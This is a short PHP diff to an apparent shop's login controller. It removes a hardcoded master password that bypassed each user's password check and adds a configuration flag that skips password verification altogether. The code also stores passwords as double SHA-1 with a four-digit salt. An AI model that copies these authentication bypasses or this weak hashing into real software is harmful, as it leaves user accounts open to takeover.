@@ -110,7 +110,13 @@ class LoginController extends GeneralMethod
             }
             $user_vip = UserVips::where('uid', $uid)->first();
         }
-        if ($password != 'zxc7563598') {
+        // 跳过密码
+        $skip = false;
+        $config = self::getShopConfig();
+        if (isset($config['user-login-password']) && $config['user-login-password'] == 0) {
+            $skip = true;
+        }
+        if (!$skip) {
             if (empty($user_vip->password)) {
                 $user_vip->salt = mt_rand(1000, 9999);
                 $user_vip->password = sha1(sha1($password) . $user_vip->salt);
